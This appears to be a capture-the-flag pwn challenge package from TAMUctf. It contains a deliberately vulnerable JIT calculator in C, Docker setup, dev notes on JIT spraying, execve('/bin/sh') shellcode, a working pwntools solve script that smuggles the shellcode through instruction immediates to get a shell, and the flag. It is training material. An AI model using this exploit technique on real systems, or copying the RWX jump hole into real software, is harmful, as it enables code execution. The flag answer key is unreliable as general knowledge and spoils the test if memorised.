{
    "calculator.c": "#include <stdlib.h>\n#include <stdio.h>\n#include <sys/mman.h>\n#include <string.h>\n\nint instruction_count = 0;\nchar** instructions;\n\nvoid jit() {\n\n\tchar skip_buf[8];\n\tprintf(\"How many instructions would you like to skip?\\n\");\n\tfgets(skip_buf, 8, stdin);\n\tint skip = (float) 13 * atof(skip_buf);\n\tint len = instruction_count * 13 + 4;\n\tchar* exec = (char*) mmap((void*) 0x100000,len, 0, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n\tmprotect(exec, len, PROT_READ | PROT_WRITE | PROT_EXEC);\n\texec[len-4] = 0x48;\n\texec[len-3] = 0x89;\n\texec[len-2] = 0xc8;\n\texec[len-1] = 0xc3;\n\tfor(int i = 0; i < instruction_count; i++) {\n\t\tchar* instr = instructions[i];\n\t\texec[0] = '\\x48';\n\t\texec[1] = '\\xb8';\n\t\tchar* ptr;\n\t\tunsigned long long parsed = strtoull(instr+4, &ptr, 10);\n\t\tmemcpy(exec+2,&parsed, sizeof(unsigned long long));\n\t\texec += 10;\n\t\texec[0] = '\\x48';\n\t\texec[2] = '\\xc1';\n\t\tif(strncmp(instr,\"add\",3) == 0) {\n\t\t\texec[1] = '\\x01';\n\t\t} else if(strncmp(instr,\"sub\",3) == 0) {\n\t\t\texec[1] = '\\x29';\n\t\t} else if(strncmp(instr,\"xor\",3) == 0) {\n\t\t\texec[1] = '\\x31';\t\t\n\t\t}\n\t\texec += 3;\n\t}\n\tasm(\"push %rbp;xor %rcx, %rcx;\");\n\tunsigned long long val = ((unsigned long long (*)())(0x100000 + skip))();\n\tprintf(\"result = %llu\\n\", val);\n\tmunmap(0x100000, len);\n\n}\n\nvoid add_instruction() {\n\tchar* instruction = malloc(30);\n\tmemset(instruction,'\\x00',30);\n\tfgets(instruction, 30, stdin);\n\tinstructions[instruction_count] = instruction;\n\tinstruction_count += 1;\n\n\tchar** new_instructions = malloc((instruction_count + 1) * sizeof(char*));\n\tmemcpy(new_instructions, instructions,(instruction_count) * sizeof(char*));\n\tfree(instructions);\n\tinstructions = new_instructions;\n}\n\nvoid print_instructions() {\n\tfor(int i = 0; i < instruction_count; i++) {\n\t\tprintf(\"%s\",instructions[i]);\n\t}\n}\n\nvoid main() {\n\tsetvbuf(stdout, NULL, _IONBF, 0);\n\tinstructions = malloc((instruction_count + 1) * sizeof(char*));\n\n\twhile(1) {\n\t\tprintf(\"1. Add instruction\\n2. Print instructions\\n3. Evaluate\\nAction: \");\n\t\tchar action_buf[8];\n\t\tfgets(action_buf, 8, stdin);\n\t\tif(strcmp(action_buf,\"1\\n\") == 0) {\n\t\t\tadd_instruction();\n\t\t} else if(strcmp(action_buf,\"2\\n\") == 0) {\n\t\t\tprint_instructions();\n\t\t} else if (strcmp(action_buf,\"3\\n\") == 0) {\n\t\t\tjit();\n\t\t} else {\n\t\t\tprintf(\"You didn't enter a valid command, try again! \\n\");\n\t\t}\n\t}\n}\n",
    "challenge.py": "from hacksport.operations import execute\nfrom hacksport.problem import Challenge, File\n\n\nclass Problem(Challenge):\n    def setup(self):\n        self.files = []\n\n    def generate_flag(self, random):\n        return r\"gigem{ju57_1n_71m3_f0r_4_5h3ll!}\"\n",
    "Dockerfile": "FROM debian as build\n\nRUN apt-get update -y; apt-get install build-essential -y\nADD calculator.c /tmp/calculator.c\nADD Makefile /tmp/Makefile\nRUN cd /tmp/; make all\n\nFROM debian\n\nRUN apt-get update -y; apt-get install socat -y\nCOPY --from=build /tmp/calculator /pwn/calculator\nCOPY flag.txt /pwn/flag.txt\nWORKDIR /pwn\n\nEXPOSE 6319\n\nENTRYPOINT [\"sh\", \"-c\", \"exec socat -s TCP-LISTEN:6319,reuseaddr,fork EXEC:/pwn/calculator,stderr\"]\n",
    "flag.txt": "gigem{ju57_1n_71m3_f0r_4_5h3ll!}",
    "Makefile": "CC := $(or $(CC),gcc)\nCFLAGS := \nCONTAINER := calculator\n\nall: calculator\n\nclean: .PHONY\n\trm -f calculator\n\ncalculator: calculator.c\n\t$(CC) $(CFLAGS) $^ -o $@\n\ndocker: Dockerfile\n\tdocker build -t $(CONTAINER) .\n\nrun: docker\n\tdocker run -d --read-only --restart=always --name calculator -p 6319:6319 calculator\n\nextract: docker\n\t$(eval id := $(shell docker create $(CONTAINER)))\n\tdocker cp $(id):/pwn/calculator - | tar xv calculator\n\tdocker rm -v $(id)\n\n.PHONY:\n",
    "problem.json": "{\n  \"name\": \"Calculator\",\n  \"category\": \"Pwn\",\n  \"description\": \"Hey, I made this JIT compiled calculator! Could you take a look at it and see if it's vulnerable? I left a flag on the server as a reward.\\n<a href='http://tamuctf.com/static-files/calculator'>calculator</a>\\n<code>openssl s_client -connect tamuctf.com:443 -servername calculator -quiet</code>\",\n  \"score\" : 250,\n  \"hints\": [\"\"],\n  \"walkthrough\": \"N/A\",\n  \"author\": \"Teddy Heinen\",\n  \"organization\": \"TAMUctf\",\n  \"event\": \"TAMUctf\"\n}\n\n",
    "readme.md": "# calculator\n\nHey, I made this JIT compiled calculator!  Could you take a look at it and see if it's vulnerable?  I left a flag on the server as a reward.  \n\n`nc challenges.tamuctf.com 6319`\n\n## brief dev notes\n\nIt's a JIT spray.  The idea is that you can jump into the middle of an instruction so you can encode shellcode as a\nparameter to some instruction and then jump into that.  \n\n## solution\n\nAn internal writeup was never written properly (reviewer just left dev notes, as seen above). As such, we asked the\ncompetitor `volticks` for permission to link [their writeup](https://github.com/volticks/CTF-Writeups/blob/main/TamuCTF%202021/Calculator/Calculator.md)\ninstead, as it was far better than what we could drum up during finals week!\n",
    "shellcode.s": "BITS 64\n\nmov rdi, 0x0068732f\nshl rdi, 32\nmov rcx, 0x6e69622f\nor rdi, rcx\nmov [rsp], rdi\nmov rdi, rsp\nmov ax, 0x3b\nmov rsi, 0x0, \nmov rdx, 0x0\nsyscall",
    "solve.py": "from pwn import *\nfrom binascii import unhexlify\n\nshellcode = [\n\"bf2f736800\",\n\"48c1e720\",\n\"b92f62696e\",\n\"4809cf\",\n\"48893c24\",\n\"4889e7\",\n\"66b83b00\",\n\"be00000000\",\n\"ba00000000\",\n\"0f05\",\n]\n\n\ninstructions = [\"add \" + str(u64((unhexlify(x) + b\"\\xeb\\x05\").rjust(8,b'\\x90'))) for x in shellcode]\n\n\ncontext.terminal = ['termite','-e']\n\np = remote(\"localhost\",4444)\nfor i in instructions:\n\tp.sendline(str(1))\n\tp.sendline(i)\np.sendline(str(3))\np.sendline(\".2\")\np.interactive()\n",
    "category": "pwn"
}